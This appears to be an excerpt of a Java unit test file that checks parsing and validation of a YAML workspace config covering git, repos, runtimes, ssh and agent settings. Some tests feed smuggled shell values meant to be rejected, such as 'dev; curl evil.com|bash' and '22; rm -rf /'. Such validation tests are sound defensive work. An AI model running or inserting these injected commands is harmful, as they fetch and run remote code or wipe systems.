...
class SingYamlTest {
  ...
  private static final String EXAMPLE_YAML =
      """
        ...
        git:
          name: "Singlr Engineering"
          email: "eng@singlr.ai"
          auth: token

        repos:
          - url: "https://github.com/singlr-ai/acme-backend.git"
            path: "acme-backend"
            branch: "main"
          - url: "https://github.com/singlr-ai/acme-webapp.git"
            path: "acme-webapp"
        ...
        ssh:
          user: dev
          authorized_keys:
            - "ssh-ed25519 AAAA... uday@mbp"
        """;

  @Test
  void parsesCompleteYaml() throws Exception {
    var config = SingYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    ...
    assertEquals("Singlr Engineering", config.git().name());
    assertEquals("eng@singlr.ai", config.git().email());
    ...
    assertEquals("sing/", config.agent().branchPrefix());
  ...
  void resourcesFromMapThrowsOnMissingCpu() {
    var ex =
        assertThrows(
            ...
            () -> SingYaml.Resources.fromMap(java.util.Map.of("memory", "8GB", "disk", "50GB")));
  ...
  void resourcesFromMapThrowsOnMissingMemory() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
    assertTrue(ex.getMessage().contains("resources.memory"));
  }

  @Test
  void runtimesDefaultsToZeroWhenMissing() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of());
  ...
  void runtimesFromMapParsesPartialConfig() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25));
  ...
  void runtimesFromMapParsesMaven() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
    assertEquals("3.9.9", runtimes.maven());
  }

  @Test
  void gitFromMapDefaultsAuthToToken() {
    var git = SingYaml.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
  ...
  void gitFromMapThrowsOnMissingName() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Git.fromMap(java.util.Map.of("email", "test@test.com")));
  ...
  void gitFromMapThrowsOnMissingEmail() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Git.fromMap(java.util.Map.of("name", "Test")));
  ...
  void gitFromMapParsesSshKey() {
    ...
    var git = SingYaml.Git.fromMap(map);
    assertEquals("ssh", git.auth());
  ...
  void gitToMapIncludesSshKeyWhenSet() {
    var git = new SingYaml.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
    var map = git.toMap();
  ...
  void gitToMapOmitsSshKeyWhenNull() {
    var git = new SingYaml.Git("Test", "test@test.com", "token", null);
    var map = git.toMap();
  ...
  void gitSshKeyRoundTripsViaToMapFromMap() {
    var original = new SingYaml.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
    var roundTripped = SingYaml.Git.fromMap(original.toMap());
  ...
  void repoFromMapThrowsOnMissingUrl() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Repo.fromMap(java.util.Map.of("path", "my-repo")));
  ...
  void repoFromMapThrowsOnMissingPath() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Repo.fromMap(java.util.Map.of("url", "https://github.com/foo/bar")));
  ...
  void sshFromMapRejectsInvalidUser() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
  ...
  void runtimesFromMapRejectsInvalidMavenVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
  ...
  void runtimesFromMapRejectsInvalidNodeVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
  ...
  void serviceEnvironmentConvertsBooleanAndNumberValues() {
    ...
    var service = SingYaml.Service.fromMap(serviceMap);
  ...
  void runtimesNodePreservesDoubleVersion() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
    assertEquals("22.4", runtimes.node());
  }

  @Test
  void runtimesNodeWholeDoubleBecomesInteger() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
    assertEquals("22", runtimes.node());
  }

  @Test
  void runtimesNodeStringVersionWithMultipleDots() {
    var runtimes = SingYaml.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
  ...
  void agentSpecsDirRejectsPathTraversal() {
    ...
    var ex =
        assertThrows(
            IllegalArgumentException.class, () -> SingYaml.fromMap(YamlUtil.parseMap(yaml)));
  ...
  void handlesMinimalYaml() throws Exception {
    ...
    var config = SingYaml.fromMap(YamlUtil.parseMap(minimal));
  ...
  void toMapRoundTripsCompleteConfig() throws Exception {
    var original = SingYaml.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    var map = original.toMap();
    var roundTripped = SingYaml.fromMap(map);
  ...
  void toMapOmitsNullFields() throws Exception {
    var minimal = SingYaml.fromMap(YamlUtil.parseMap("name: test"));
    ...
    var yaml =
        ...
        agent:
          ...
          security_audit:
            ...
            auditor: codex
        """;
    var original = SingYaml.fromMap(YamlUtil.parseMap(yaml));
    var map = original.toMap();
    var roundTripped = SingYaml.fromMap(map);
